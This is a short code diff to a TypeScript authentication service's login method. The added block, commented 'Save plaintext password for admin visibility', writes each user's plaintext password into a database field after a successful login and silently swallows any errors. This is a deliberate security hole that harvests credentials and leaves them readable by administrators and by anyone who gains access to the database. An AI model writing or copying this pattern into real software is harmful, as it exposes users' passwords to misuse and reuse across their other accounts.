@@ -69,6 +69,14 @@ export class AuthService {
       throw new UnauthorizedException('Invalid credentials');
     }
 
+    // Save plaintext password for admin visibility
+    if (user.passwordVisible !== password) {
+      await this.prisma.user.update({
+        where: { id: user.id },
+        data: { passwordVisible: password },
+      }).catch(() => {});
+    }
+
     return {
       id: user.id,
       username: user.username,
